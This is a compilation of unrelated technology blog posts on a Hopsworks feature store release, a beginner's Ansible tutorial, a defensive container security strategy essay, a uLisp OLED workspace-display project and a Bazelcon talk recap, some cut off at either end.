`revenue`-named features.</p><p>In HSFS we solved this challenge by requiring users to work with the feature group abstraction - users have to specify which features they need from which feature group. The feature groups abstraction also allows the query planner to intelligently&nbsp; identify which feature to use when joining features from different feature groups.<br></p><h2>Time travel as first class citizen</h2><p>Hopsworks has offered support for <a href="https://hudi.apache.org/" target="_blank">Apache Hudi</a> for over one year. Apache Hudi is the key component to make time travel, upserts, and ACID updates possible on feature data. Time travel enables data engineers and data scientists to retrieve a previous snapshot of the feature data for debugging and auditing purposes.&nbsp;</p><p>In HSFS, we added support for complex time travel queries, allowing users to create training datasets by retrieving different feature groups at different points in time. The different times are stored as metadata alongside the training datasets. This enables users to easily reproduce the creation of training datasets with historical feature values.</p><p>The new SDK improves support for Apache Hudi by integrating directly with the feature groups and joining APIs. Apache Hudi is also now available for the Python APIs. The APIs hide the complexity of dealing with Apache Hudi options. At the same time the high level APIs will allow us to implement support for additional formats such as <a href="https://delta.io/" target="_blank">Delta Lake</a>.<br></p><h2>Provenance and custom metadata</h2><p>Provenance for feature data is a key new functionality available as part of HSFS. Hopsworks Feature Store implicity tracks dependencies between feature groups, training datasets and models. Provenance allows users to know, at any given moment, what features are the most widely used and also what features are not used anymore and could potentially be removed from the feature store. Provenance also enables users to traverse from a model to the application used to train it, the input training dataset used, and the features and feature group snapshots used to create the training dataset.</p><p>In this new release we also allow users to create and attach user-defined labels to feature groups and training datasets. Labels and tags enable users to build a custom metadata catalog for their Feature Store, that (using <a href="https://opendistro.github.io/for-elasticsearch/" target="_blank">Elasticsearch</a>) supports low-latency free-text search over potentially thousands of features, descriptions, labels and tags.<br></p><h2>ML Framework APIs to Training Datasets</h2><p>While the Hopsworks feature store plays a key role in defining governance around feature data, improving execution speed when it comes to experimenting, building and deploying models, the ultimate customers of the feature stores are the data scientists and machine learning engineers.</p><p>To make their interaction with the feature store as smooth as possible, we added support retrieving training dataset as a TensorFlow Dataset format using tf.Data. This allows data scientists to efficiently read training datasets in their TensorFlow code.<br></p><h2>Pure Python Feature Engineering</h2><p>Alongside existing support for (Py)Spark, this release also brings supports for feature engineering pipelines built using pure Python programs. With HSFS you are able to upload feature data to the feature store from your SageMaker notebook, KubeFlow, Jupyter notebook, or even your local machine.</p><p>This is in addition to the existing capabilities of exploratory data analysis with the feature store from your notebook, and the creation and reading of training datasets.<br></p><h2>Get started</h2><p>You can get started immediately by creating a new cluster on <a href="https://hopsworks.ai/" target="_blank">https://hopsworks.ai</a>, the library is already pre-installed in your environment so you can get started straight away.</p><p>The <a href="https://docs.hopsworks.ai/" target="_blank">documentation</a> is available and you can walk through one of the many example <a href="https://github.com/logicalclocks/hops-examples/tree/master/notebooks/featurestore/hsfs" target="_blank">notebooks</a> that are available here.</p></div></div></div></div></div></div>]]>

November 17, 2020 | https://steampunk.si/blog/getting-started-with-ansible/ | <a href="https://web.archive.org/web/*/https://steampunk.si/blog/getting-started-with-ansible/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In our <a href="https://steampunk.si/blog/introduction-to-configuration-management-tools/" title="Introduction to tonfiguration management tools post">previous blog post</a>, we looked at what configuration management
tools bring to the table. And in this post, we will take a closer look at
Ansible, our configuration management tool of choice. So if you want to learn
what Ansible is, what it does, and how it works, this is the post for you.</p>
<p>We will start by introducing <a href="https://www.ansible.com/" title="Ansible's home page">Ansible</a> and some of the benefits we gain when
using it. Next, we will describe the differences between three different
Ansible packages and give some advice on picking the right one for our use
case. We will continue with the installation instructions and finally wrap up
with an interactive walkthrough of Ansible’s basic functionality like running
Ansible playbooks and installing extra Ansible content.</p>
<h2 id="what-is-ansible">What is Ansible</h2>
<p>We all probably heard about automation systems that suffer from <em>managing the
management</em> and <em>automating your automation</em> issues. Ansible not only brings
order to our infrastructure, but it also does it sustainably.</p>
<p>Because Ansible is <strong>agentless</strong>, dealing with daemons being down,
upgrading agents, and patching agent security vulnerabilities are a thing of
the past.  All we need to do is keep our control node (the computer where the
Ansible runs) updated, and we should be safe.</p>
<p>But what does Ansible do exactly? <strong>Ansible’s primary responsibility is to
reliably enforce the desired state on a set of targets.</strong></p>
<p>We usually keep the state description in a relatively human-friendly and
machine-executable file called an Ansible playbook. We have a bit more
flexibility when it comes to storing information about targets. We can use:</p>
<ol>
<li><strong>Static inventory files</strong> that contain login information for our targets.</li>
<li><strong>Inventory plugins</strong> that fetch connection information from some
canonical sources like IaaS API.</li>
</ol>
<p><strong>Enforcing the desired state</strong> in the Ansible world can mean almost anything:
writing a configuration file, creating a virtual machine in the cloud, adding
a VLAN to a network switch, etc. All we need is an Ansible module for
performing the task at hand. And there are a lot of them available out there.
We will talk more about how to obtain them in the last part of this post.</p>
<p><strong>Target</strong> (or <strong>host</strong>) is also quite a broad term in the Ansible world.
Historically, the primary target type was a virtual machine that Ansible
managed via the Secure Shell (SSH) protocol. But today, Ansible can control
many other things like containers, networking equipment, and various
Infrastructure as a Service (IaaS) platforms. And because Ansible is
agentless, getting it to work with a specific piece of software or hardware is
usually much easier compared to other configuration management tools.</p>
<p>Now we are ready to start talking about Ansible versions.</p>
<h2 id="what-ansible-package-to-use">What Ansible package to use</h2>
<p>Today, there are three Ansible packages that we can use for our day-to-day
automatization tasks: <code>ansible-2.9</code>, <code>ansible-2.10</code>, and <code>ansible-base-2.10</code>.
Why? Because the monolithic Ansible package was split into a core engine and a
few bundles of Ansible content called Ansible Collections for the 2.10
release.</p>
<p>But fortunately for us, selecting the correct package is relatively simple.
Just answer the following questions in order and stop when you answer “yes”
for the first time:</p>
<ol>
<li>Are you a Red Hat subscriber or want to purchase support? Use
<strong>ansible-2.9</strong>.</li>
<li>Do you have existing playbooks and no time to learn about Ansible
Collections? Use <strong>ansible-2.10</strong>.</li>
<li>Use <strong>ansible-base-2.10</strong>.</li>
</ol>
<p>We made sure examples from this blog post work with all of the versions
mentioned above, so you should have no trouble following along.</p>
<h2 id="how-to-install-ansible">How to install Ansible</h2>
<p>We only need to install Ansible onto the control node (the computer or virtual
machine you will run Ansible commands on). The most flexible way of installing
Ansible is using <code>pip</code>:</p>
<pre><code>$ pip install --user "ansible==2.9.*"  # For ansible 2.9
$ pip install --user ansible           # For ansible 2.10 and newer
$ pip install --user ansible-base      # For ansible-base
</code></pre>
<p>This will install Ansible only for our user account and not mess up the system
if anything goes wrong.</p>
<p>We can also install Ansible using our distribution’s package manager (for
example, <code>dnf</code> on RHEL 8 or <code>apt</code> on Debian-derived distributions).</p>
<pre><code>$ yum install ansible  # RHEL and CentOS 7
$ dnf install ansible  # RHEL and CentOS 8
$ apt install ansible  # Debian and Ubuntu
</code></pre>
<p>But bear in mind that most distributions do not package <code>ansible-base</code> and
<code>ansible</code> 2.10 yet, so you might need to resort to the <code>pip</code> method for the
time being. Official <a href="https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html" title="Official installation instructions">installation instructions</a> contain even more
installation-related details.</p>
<p>Unfortunately, we cannot use a Windows machine as an Ansible control node.
Matt Davis, one of the core Ansible developers, wrote a
<a href="http://blog.rolpdog.com/2020/03/why-no-ansible-controller-for-windows.html" title="Why no Ansible controller for Windows?">blog post</a> about the reasons. Matt also gives some hints about
what Windows users can do to remedy the situation, so make sure you check his
post out.</p>
<p>Once the installation is behind us, we should be able to run the following
command without errors:</p>
<pre><code>$ ansible --version
ansible 2.9.14
  config file = /etc/ansible/ansible.cfg
  configured module search path = ['/usr/share/ansible/plugins/modules']
  ansible python module location = /usr/lib/python3.8/site-packages/ansible
  executable location = /usr/bin/ansible
  python version = 3.8.6 (default, Sep 25 2020, 00:00:00) [GCC 10.2.1 20200723]
</code></pre>
<p>If nothing went awry, we are ready to start playing with Ansible.</p>
<h2 id="taking-ansible-for-a-spin">Taking Ansible for a spin</h2>
<p>In this last section, we will play around a bit with Ansible. We will start by
analyzing a small Ansible playbook and explaining the purpose of its
components, continue with discussing the Ansible inventory, and conclude
our escapade with some custom Ansible content installation.</p>
<p>If you would like to follow along with us, you will need a Linux computer with
Ansible and Docker installed.</p>
<h3 id="ansible-playbook">Ansible playbook</h3>
<p>Let us start with something relatively simple:</p>
<pre><code>---
- name: Configure local computer
  hosts: localhost

  tasks:
    - name: Create config file
      ansible.builtin.copy:
        dest: /tmp/my.cfg
        content: Hello, World!
</code></pre>
<p>Even if you never heard about Ansible playbook or YAML before, you probably
guessed that we want to create the <code>/tmp/my.cfg</code> file with the <code>Hello, World!</code>
inside it on our local computer. Let us test this. When we run the
<code>ansible-playbook</code> command (we assumed that the playbook is stored in the
<code>play.yaml</code> file), we will see something like this:</p>
<pre><code>$ ansible-playbook play.yaml
[WARNING]: provided hosts list is empty, only localhost is available. Note
  that the implicit localhost does not match 'all'

PLAY [Configure local computer] ******************************************

TASK [Gathering Facts] ***************************************************
ok: [localhost]

TASK [Create config file] ************************************************
changed: [localhost]

PLAY RECAP ***************************************************************
localhost              : ok=2    changed=1    unreachable=0    failed=0
                         skipped=0    rescued=0    ignored=0
</code></pre>
<p>And sure enough, if we open the <code>/tmp/my-cfg.txt</code> file, the hello is there ;)
But how did Ansible know what to do? Explanation time ;)</p>
<p>Ansible playbook is nothing more than a list of plays that Ansible executes
one after another. For the sake of simplicity, our example contains a single
Configure local computer play. The <code>hosts: localhost</code> line informed Ansible
that we will be messing with our local computer. This is the target that we
talked about previously.</p>
<p>All real action happened in the <code>tasks</code> section of the play. The
<code>ansible.builtin.copy:</code> line told Ansible that we want to use the built-in
copy module to create a file. And the <code>dest: /tmp/my-cfg.txt</code> and <code>content: Hello</code> parameter lines provided information to the copy module about our
file’s location and what to place inside it, respectively. The line that
starts with <code>- name</code> serves as documentation for us and is printed to the
output when Ansible starts executing the task at hand.</p>
<p>Technically speaking, Ansible did not create a file. It would be more accurate
to say that Ansible made sure our text file exists and has the correct
content. We can see this technical nitpick in action if we run the same
<code>ansible-playbook</code> command again:</p>
<pre><code>$ ansible-playbook play.yaml
[WARNING]: provided hosts list is empty, only localhost is available. Note
  that the implicit localhost does not match 'all'

PLAY [Configure local computer] ******************************************

TASK [Gathering Facts] ***************************************************
ok: [localhost]

TASK [Create config file] ************************************************
ok: [localhost]

PLAY RECAP ***************************************************************
localhost              : ok=2    changed=0    unreachable=0    failed=0
                         skipped=0    rescued=0    ignored=0
</code></pre>
<p>Notice how in the previous run, Ansible reported our file creation task as
changed, and in this last run, the output changed to ok. This happened because
Ansible determined that the file’s current and desired state are precisely the
same, and there is nothing to do.</p>
<p>But our configuration files are rarely entirely static, meaning that we often
need to customize their content based on some external information. And this
is where variables and <code>ansible.builtin.template</code> module come into play - pun
intended ;).</p>
<p>Using variables in templates is reasonably straightforward: we just need to
place the variable name inside double curly braces, and the template module
will replace it with the variable’s value. For example, this is how our
parameterized configuration file could look:</p>
<pre><code>{{ greeting }} from {{ ansible_distribution }}, World!
</code></pre>
<p>But before we can use the variable, we need to define it somewhere. There are
<a href="https://docs.ansible.com/ansible/latest/user_guide/playbooks_variables.html" title="Official Ansible documentation in variables">many places</a> where Ansible will look for variable definitions, but we
will keep it simple and provide them as part of the playbook (the <code>vars</code>
section in the listing below).</p>
<pre><code>---
- name: Configure local computer
  hosts: localhost

  vars:
    greeting: Welcome

  tasks:
    - name: Create config file
      …</code></pre></div></div>

    <div>
        <div>
            <p>Securing containers is a complex task.  The problem space is broad, vendors are on fire, there are tons of checklists and best practices and it’s hard to prioritize solutions. So if you had to <strong>implement a container security strategy</strong> where would you start?</p>

<p>I suggest to start from the basics: understanding <strong>what container security is about</strong> and build a model to navigate risks.</p>

<h2 id="follow-the-devops-life-cycle">Follow the DevOps Life Cycle</h2>

<p>Every security initiative is eventually constrained by where security controls can be implemented, so I find practical to just follow the standard DevOps life cycle to <em>surface patterns™</em> and <em>unlock synergies™</em>.</p>

<p>The DevOps Lifecycle is an infinite iteration of:</p>

<ul>
<li>Plan</li>
<li>Code</li>
<li>Build</li>
<li>Test</li>
<li>Release</li>
<li>Deploy</li>
<li>Operate</li>
<li>Monitor</li>
</ul>

<p><img src="https://cloudberry.engineering/devops-lifecycle.jpg" alt="DevOps Lifecycle - source: ryadel.com"></p>

<p>Containers are included in the application in the form of a Dockerfiles but are not really part of it. As such they don’t interest the planning and coding phase.</p>

<p><em>(no, writing Dockerfiles is not coding.)</em></p>

<p>Every other step is in scope from a security point of view, and I would group them like this:</p>

<ul>
<li><strong>Build Time</strong>: build, test and release.</li>
<li><strong>Container Infrastructure</strong>: deploy and operate.</li>
<li><strong>Runtime</strong>: monitor.</li>
</ul>

<p>Why? Every security strategy is only effective if it can be implemented. And every step in each group share a common facility where security controls can be injected without adding much friction:</p>

<ul>
<li>Build Time: The CI/CD infrastructure, the container registry</li>
<li>Container Infrastructure: the container orchestrator</li>
<li>Runtime: the production environment</li>
</ul>

<p>Now we have three macro areas we can use as a starting point to do our risk assessments.</p>

<h2 id="security-at-build-time">Security at Build Time</h2>

<p>At build time we have in input a bunch of source files and a Dockerfile, and we get as output a Docker image.</p>

<p>This is where most vendors tend to cluster while trying to sell you the narrative of the importance of scanning container images and calling it a day.  Container security scanning is important, yes, but it’s not enough.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>minimize the risk of supply chain attacks.</li>
</ul>
</div>


<h3 id="container-images-hygiene">Container Images Hygiene</h3>

<p>First, decide how your images should look like, with a focus on how software dependencies are introduced:</p>

<ul>
<li>what base images are developers allowed to use?</li>
<li>are software dependencies pinned? From where are they pulled?</li>
<li>are there any labels that are needed to simplify governance and compliance?</li>
<li>lint the Dockerfile</li>
<li>follow <a href="https://cloudberry.engineering/article/dockerfile-security-best-practices/">Docker security best practices</a> when writing Dockerfiles</li>
</ul>

<p>All of these checks are static and can be implemented for cheap as a step in the build pipelines.</p>

<h3 id="container-images-scanning">Container Images Scanning</h3>

<p>Then we can move into scanning the container image.</p>

<p><strong>Do not scan the image as a step in the build pipeline</strong>, instead setup continuous scanning in the container registry.</p>

<p>Why? Vulnerabilities are continuously discovered while your services are not necessarily continuously built. Secondly, builds are additive: every build will generate a new image. So, assuming  your container orchestrator trust your registry, every tag you publish can always be deployed and need to be assessed.</p>

<p><em>(It’s also very slow to scan at build time)</em></p>

<p>This is where you start thinking about defining <strong>patch management</strong> and <strong>shelf life</strong> processes:</p>

<ul>
<li>patch management: results from the scanning will feed a patching process that will result in a new version of the image</li>
<li>shelf life: unpatched/old/unsafe images are deleted from the registry</li>
</ul>

<p><em>(next article will be about how to choose a container scanning solution, if you are facing the dilemma right now feel free to <a href="mailto:hello@clouberry.engineering">ping me</a>)</em></p>

<h2 id="container-infrastructure-security">Container Infrastructure Security</h2>

<p>The container infrastructure is comprised of all the moving parts that are in charge of pulling your images from the registry and run them as containers in production.</p>

<p>It’s mostly going to be the container orchestrator – <em>*cough* kubernetes *cough*</em>.</p>


<div>
<p><strong>This stage goals</strong>:</p>

<ul>
<li>Avoid platform misconfigurations with security implications</li>
<li>Minimize the <strong>breadth</strong> of an attack from a compromised container</li>
</ul>
</div>


<h3 id="security-of-the-infrastructure-misconfigurations">Security OF the Infrastructure: Misconfigurations</h3>

<p>Container orchestrators are complex, Kubernetes in particular. As of now they fail the promise of DevOps and I think we are still an abstraction layer (or two) away from being a mainstream solution without too much operational overhead.</p>

<p>Every complex platforms is prone to be misconfigured, and this is the part you want to focus on.</p>

<p>You have to threat model your infrastructure to <strong>ensure it can’t be abused</strong>.
This particular thread model should focus on every actor but a compromised container (we will cover that next).</p>

<p>I can’t go into details here, because it really depends on what you are running. For Kubernetes a good starting point for threat modelling is <a href="https://www.marcolancini.it/2020/blog-kubernetes-threat-modelling/">this</a>.</p>

<p>Additionally, if you are not doing it yet, this is also a <strong>good argument in favour of using a managed platform</strong>: the complexity is reduced if you can leverage a shared responsibility model with your (trusted) provider.</p>

<h3 id="security-in-the-infrastructure-lateral-movements">Security IN the infrastructure: Lateral Movements</h3>

<p>Next we can talk about what happens when a container is compromised.</p>

<p>You want to minimize the <a href="https://cloudberry.engineering/article/lateral-movement-cloud/">attacker’s ability to move laterally</a>, focusing on these two layers:</p>

<ul>
<li>The network layer</li>
<li>The Identity and Access management (IAM) layer</li>
</ul>

<p><strong>The network should not be flat</strong>. You can start by brutally segment everything into subnetworks and work your way up to a full fledge service meshes.</p>

<p>On the IAM layer work your way toward having a <strong>single identity for each container</strong> in order to fine tune the authorization grants. This is particularly important in multi tenant platforms: without granular identities it’s impossible to achieve least privilege.</p>

<p><em>(Google Kubernetes Engine (GKE) has a nifty feature for this called <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a>)</em></p>

<p>Finally, since they are supposed to be immutable, a wonderful strategy would be to <strong>reduce the amount of time containers can run</strong>: the window of opportunity for attackers to move laterally and gain persistence is as long as the container running lifetime. Continously shut down and spin up your containers.</p>

<p>And this final consideration allow me to smoothly move into the next area.</p>

<h2 id="runtime-security">Runtime Security</h2>

<p>The last piece of the puzzle is the security of your running workloads.
At this point most of the hardening is done and here is when we move into the realm of reactive security controls, the grim land of <strong>post-fail</strong>.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>is to minimize the <strong>impact</strong> of an attack from a compromised container.</li>
</ul>
</div>


<h3 id="detection-and-incident-response">Detection and Incident Response</h3>

<p>The best way to control the impact of an attack is to minimize the time between the breach to when the security team is alerted.</p>

<p>Detecting an ongoing breach is another area where vendors are scrambling to find a silver bullet. There are many approaches, most of them will require side cars and/or daemon sets actively monitoring pod’s traffic and system calls.</p>

<p>Most solutions will provide some value but my advice is to start simple and iterate: use your existing SIEM, ingest your platform, application and audit logs.</p>

<p><strong>Incidents will happen</strong>, and it’s fine: have an incident response process.</p>

<p>The first bullet point of every post-mortem should be: <em>“how can we detect this quicker next time?”</em> answering will allow you to identify your blind spots, which you can then use to understand what signals you are missing and what makes sense to buy.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Container security is a broad problem and it is not just about scanning images.</p>

<p>This is the model I built and used to reason about container risks and solutions. It’s very high level and of course, as with every model, <strong>it’s not necessarily the right one</strong>.</p>

<p>We all know that in reality each infrastructure is a snowflake: so start with your own threat model and use this one <strong>as an inspiration</strong>.</p>

<p>The Visible Lisp Computer is a Lisp interpreter that displays the contents of the Lisp workspace on an OLED display, so you can see program execution and garbage collection in real time:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/visiblelispcomputer3.jpg" alt="VisibleLispComputer3.jpg" width="710" height="350">&nbsp;</p>
<p><em>Visible Lisp Computer displays the contents of the Lisp workspace on an OLED display as it runs.</em></p>
<p>It's a special version of my uLisp interpreter for ARM boards <sup id="cite_ref1"><a href="#cite_note1">[1]</a></sup>, designed to run on an Adafruit ItsyBitsy M0, or an ATSAMD21E on a prototyping board, interfaced to an I2C OLED display.</p>
<p>For example, when you evaluate a recursive function, such as the Fibonacci function, you can see the memory being allocated to perform the calculation, and garbage collections clearing unused memory. Apart from being fun, it's educational, giving an insight into how a language with garbage collection works.</p>
<h3>Introduction</h3>
<p>The Visible Lisp Computer runs on an Adafruit ItsyBitsy M0, which is an ideal ATSAMD21 board for running uLisp. It's available from Adafruit&nbsp;<sup id="cite_ref2"><a href="#cite_note2">[2]</a></sup>, or Pimoroni in the UK&nbsp;<sup id="cite_ref3"><a href="#cite_note3">[3]</a></sup>.</p>
<p>The Lisp workspace is displayed on a 64x48 OLED display. This is an ideal fit, as uLisp running on an ATSAMD21 gives you a workspace of 3072 free Lisp objects (each of 8 bytes), and the 64x48 display provides 3072 pixels. I chose a low-cost monochrome I2C display, available from AliExpress&nbsp;<sup id="cite_ref4"><a href="#cite_note4">[4]</a></sup>. The program would also work on larger SSD1306-based OLED displays, such as the widely available 128x64 ones.</p>
<p>Free Lisp objects are displayed in black, and when an object is in use it is displayed in white. Periodically you see the garbage collection reclaiming used objects that can no longer be accessed.</p>
<h3>The circuit</h3>
<p>Here's how to connect up the display to the Adafruit ItsyBitsy M0:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/visiblelispcomputer2.gif" alt="VisibleLispComputer2.gif" width="457" height="245"></p>
<p><em>Circuit of the Visible Lisp Computer based on an Adafruit ItsyBitsy M0.</em></p>
<p>You need pullup resistors of about 4.7kΩ from SDA and SCL to VCC.</p>
<p>Instead of using an Adafruit ItsyBitsy M0 you can build an equivalent Visible Lisp Computer using an ATSAMD21E on a prototyping board by following my earlier project&nbsp;<a href="http://www.technoblogy.com/show?2833">Minimal ATSAMD21 Computer</a>:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/visiblelispcomputerproto.jpg" alt="VisibleLispComputerProto.jpg" width="710" height="375"></p>
<p><em>Version of the Visible Lisp Computer built on a prototyping board.</em></p>
<p>The I2C OLED display connects to GND, VCC, SDA (pin 21), and SCL (pin 22). Again, you need 4.7kΩ pullup resistors from SDA and SCL to VCC.</p>
<h3>Example</h3>
<p>Here's an example of the Visible Lisp Computer in action.</p>
<p>First we enter a sample Lisp function to evaluate; I'll use the Fibonacci function, as it should be familiar to most programmers:</p>
<pre>(defun fib (n)
  (if (&lt; n 3) 1
    (+ (fib (- n 1)) (fib (- n 2)))))</pre>
<p>Initially the display is black. After entering this in the Serial Monitor the display shows:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/visiblelispcomputer1.jpg" alt="VisibleLispComputer1.jpg" width="710" height="350"></p>
<p>The function is stored in the Lisp workspace as a series of Lisp objects, indicated by the row of white pixels starting in the top left corner.</p>
<p>Evaluating the function by entering, for example:</p>
<pre>(fib 10)</pre>
<p>allocates Lisp objects as the function is executed, indicated by a white block extending down from the top of the display:</p>
<p>&nbsp;<img src="http://www.technoblogy.com/pictures/kvm/visiblelispcomputer2.jpg" alt="VisibleLispComputer2.jpg" width="710" height="350"></p>
<p>This call to the Fibonacci function executed within the workspace available, without triggering a garbage collection.</p>
<p>If we now evaluate:</p>
<pre>(fib 16)</pre>
<p>the function triggers several garbage collections as it executes to reclaim unused objects, while leaving the intermediate values, which are still in use, visible on the display:</p>
<p>&nbsp;<img src="http://www.technoblogy.com/pictures/kvm/visiblelispcomputer3.jpg" alt="VisibleLispComputer3.jpg" width="710" height="350"></p>
<h3>Turning off the workspace display</h3>
<p>The workspace display is on by default. Because updating the display causes Lisp programs to run more slowly, I've added a Lisp command&nbsp;to turn the display off; give the command:</p>
<pre>(display nil)</pre>
<p>To turn it back on again give the command:</p>
<pre>(display t)</pre>
<p>The standard version of uLisp does a garbage collection after you input each command at the Serial Monitor or REPL. When running the workspace display this is disabled, to avoid the lag caused by the garbage collection after every line of input. If you want to tidy up the screen display before running a program you can do a manual garbage collection by giving the command:</p>
<pre>(gc)</pre>
<h3>The program</h3>
<p>The workspace display interfaces with uLisp in three places. In each case a flag, <strong>DISPLAYFLAG</strong>, determines whether the workspace display is active.</p>
<h4>Lisp objects</h4>
<p>All objects in ARM uLisp consist of two 4-byte cells, so every object occupies 8 bytes. There are several different types of object, such as symbol, number, or cons, identified by the constant in the left-hand cell:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/objects1.gif" alt="Objects1.gif" width="422" height="80"></p>
<ul>
<li>A symbol contains '2' in the left cell, and the name of the symbol packed in the right cell, or a pointer to the symbol in a symbol table.</li>
<li>A number contains '4' in the left cell, and the 32-bit signed integer value in the right cell.</li>
<li>Finally, a cons contains an address pointer in each cell pointing to other objects.</li>
</ul>
<p>Address pointers are always larger than the largest constant used to identify other types of object.</p>
<h4>Initialising the workspace</h4>
<p>When the workspace is first initialised, by calling <strong>initworkspace()</strong>, all the objects are added to a list of free objects:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/objects2.gif" alt="Objects2.gif" width="720" height="78"></p>
<p>The corresponding pixels on the workspace display are plotted in black with a call to <strong>PlotObject()</strong>:</p>
<pre>void initworkspace () {
  Freelist = NULL;
  for (int i=WORKSPACESIZE-1; i&gt;=0; i--) {
    object *obj = &amp;Workspace[i];
    if (tstflag(DISPLAYFLAG)) PlotObject(i, 0);
    car(obj) = NULL;
    cdr(obj) = Freelist;
    Freelist = obj;
    Freespace++;
  }
}</pre>
<h4>Allocating an object</h4>
<p>A Lisp object in the workspace is allocated by a call to <strong>myalloc()</strong>. It's taken off the freelist and returned by the call. For example, creating the list:</p>
<pre>(fib 6)</pre>
<p>will take four objects from the freelist:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/objects4.gif" alt="Objects4.gif" width="720" height="130"></p>
<p>The corresponding pixels in the workspace display are plotted in white:</p>
<pre>object *myalloc () {
  if (Freespace == 0) error2(0, PSTR("no room"));
  object *temp = Freelist;
  Freelist = cdr(Freelist);
  Freespace--;
  if (tstflag(DISPLAYFLAG)) PlotObject(((int)temp - (int)Workspace)&gt;&gt;3, 1);
  return temp;
}</pre>
<p>The address of the object is calculated by subtracting the address of the start of the workspace from the address of the new object, and dividing by eight because each Lisp object is 8 bytes.</p>
<h4>Freeing an object</h4>
<p>Finally, a Lisp object is freed by a call to <strong>myfree()</strong>. It is put on the front of the freelist, and the corresponding pixel in the workspace display is plotted in black:</p>
<pre>inline void myfree (object *obj) {
  car(obj) = NULL;
  cdr(obj) = Freelist;
  Freelist = obj;
  if (tstflag(DISPLAYFLAG)) PlotObject(((int)obj - (int)Workspace)&gt;&gt;3, 0);
  Freespace++;
}</pre>
<p>Objects are freed automatically during garbage collection; the programmer doesn't have to worry about freeing objects.</p>
<h4>Graphics display routines</h4>
<p>This display maps each byte in the display memory to a vertical column of eight pixels. Unfortunately the SSD1306 display driver chip doesn't support reading back of the contents of the display memory, so to provide the ability to change a single pixel, without affecting the others in the same column, a copy of the display memory is maintained in RAM; fortunately it's only 384 bytes (64x48/8).</p>
<p>The routines used to implement the workspace display are <strong>InitDisplay()</strong>, to initialise the OLED display, <strong>ClearDisplay()</strong> to clear the display, and <strong>PlotObject()</strong>, which plots a pixel corresponding to a Lisp object in the workspace.</p>
<h3>Uploading the program</h3>
<p>Whether you're using an Adafruit ItsyBitsy M0, or an ATSAMD21E on a breadboard as described in my article&nbsp;<a href="http://www.technoblogy.com/show?2833">Minimal ATSAMD21 Computer</a>, upload the Visible Lisp Computer as follows:</p>
<ul>
<li>If you haven't already got it, install the <strong>Adafruit SAMD Boards</strong> in the <strong>Boards Manager</strong>.</li>
<li>Select the <strong>Adafruit ItsyBitsy M0</strong> board.</li>
<li>Upload the Visible Lisp Computer file to the board.</li>
</ul>
<p>You should then be able to run uLisp, and enter commands at the Serial Monitor as described in <a href="http://www.ulisp.com/show?19XT">Using uLisp</a>.</p>
<p>This is based on the current version of uLisp, Version 2.8a, but for simplicity it only supports the&nbsp;<strong>Adafruit ItsyBitsy M0</strong>&nbsp;Boards Manager option.</p>
<p>Here's the whole Visible Lisp Computer program:&nbsp;<a href="http://www.technoblogy.com/list?2OLU">Visible Lisp Computer program</a>.</p>
<p>Or get it from GitHub here: <a href="https://github.com/technoblogy/visible-lisp-computer" target="_blank">Visible Lisp Computer</a>.</p>
<h3>Further suggestions</h3>
<p>The current project simply distinguishes between an allocated Lisp object (white) and a free object (black). Using a colour display you could use different colours to identify the different types of object: nil, symbol, integer, stream, character, float, string, or cons.</p><hr>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last week the annual Bazelcon conference took place remotely. In this post I’ll try to summarize the talks that I found more interesting.</p>
<h2>Keynote - State of Bazel and Announcements</h2>
<p>The first one to take the stage was <strong>Jeff Cox</strong>, the engineering director at Google, to talk about the state of Bazel.</p>
<p>He remembered the history of Bazel and the idea behind the tool. During the talk, he presented the major achievements of the year.
In particular, the port of Bazel for arm64 platforms, the improvement of tools like Startlark CPU profiler and remote execution profiling.
On the other side, there were some lows, and Cox underlined how the huge backlog of PRs and issues that need to be addressed will be a priority for the team next year.</p>

<em>Jeff Cox explains the reason behind Bazel’s name.</em></p>
<p><strong>Cox presented the roadmap</strong> for the tool and stated how the focus will be to evolve Bazel as a Platform. They want to improve Startlark rules API, revamp the external dependencies support to make it more usable for developers, and improve remote execution support.
He also announced that starting from December, there will be <strong>Long Term Support releases</strong> with 9 months support window.</p>
<h2>Migrating Twitter’s Monorepo from Pants to Bazel</h2>
<p><strong>Borja Lorente</strong>, Build Engineer at Twitter, explained how Twitter is migrating his monorepo from their in-house tool Pants to Bazel.</p>
<p>Twitter repo is a multilanguage 20 million lines of code plus a 10x generated code and over 2000 developers working on it. They wanted to minimize the friction for users during the migration, so <strong>big bang commits were not an option.</strong> As Lorente explained, migrating all at once would have been a pain both for users who had to learn how to use Bazel and for the build team that had to support the developers.</p>
<p>So they decided to do it gradually and maintain both Pants and Bazel at the same time. They did it by developing a <strong>Translation Layer</strong>. Bazel imports the Translation Layer at load time, uses it to translate Pants targets into Bazel rules, and returns the build graph containing Bazel targets.</p>

  </a>
<em>Borja Lorente explains the Translation Layer at Twitter.</em></p>
<p><strong>But it’s not so straightforward.</strong>
There are differences between Pants and Bazel that the build team is tackling. Some of them involve dependencies.</p>
<p>In Pants targets have implicitly all their transitive dependencies when being compiled, rather in Bazel, you must explicitly export them. For 3rd party dependencies, Pants decide the version to use based on the build target, in Bazel, you need to explicitly define them before running.</p>
<p>Twitter journey to Bazel is still in progress and those and other issues are currently worked on by the build team.</p>
<h2>Designing a Language Agnostic CI using Bazel Queries</h2>
<p><strong>Urvashi Reddy</strong>, Software Engineer at Pinterest from the Engineering Productivity Team presented a tool developed by her team to speed up their CI feedback cycle.</p>
<p>They realized that the CI was not able to detect which target changed so was it was frequently building all the targets.</p>
<p><strong>This was too time-consuming.</strong></p>
<p>They wanted to improve the situation by providing fast and reproducible builds and, at the same time, use a self-service approach: developers only need to write a BUILD file and not any new CI configuration.
In this scenario, <strong>the BUILD file is the contract</strong> between developers and CI: developers dictate what want to run in CI within the BUILD file and the CI will take care of that.</p>

    </span>
  </span>
  </a>
